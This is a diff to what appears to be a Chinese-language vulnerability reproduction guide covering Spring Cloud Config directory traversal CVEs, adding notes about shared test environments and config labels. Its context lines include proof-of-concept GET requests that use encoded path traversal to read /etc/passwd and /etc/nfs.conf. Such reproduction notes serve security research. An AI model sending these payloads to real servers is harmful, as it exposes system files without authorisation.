@@ -558,6 +558,7 @@ protected Object doZipTransform(final Message<?> message) throws Exception {
 ```
 
 ## （10）Spring Cloud Config
+CVE-2019-3799、CVE-2020-5405、CVE-2020-5410类似，可复用同一环境，更改Spring Cloud Config版本即可
 ### CVE-2019-3799 Directory Traversal
 Affected Version: < 2.1.2 or 2.0.4 or 1.4.6  
 Diff: https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2   
@@ -565,7 +566,7 @@ POC:
 ```
 GET /a/b/test/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
 ```
-Conf:
+Conf:（远程）
 ```
 info:
   component: Config Server
@@ -624,7 +625,7 @@ POC:
 ```
 GET /1/1/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29etc/nfs.conf
 ```
-Conf:
+Conf:（本地）
 ```
 info:
   component: Config Server
@@ -686,5 +687,6 @@ public static String normalize(String s) {
     return s != null && s.contains("(_)") ? s.replace("(_)", "/") : s;
 }
 ```
+Conf同CVE-2020-5405
 
 
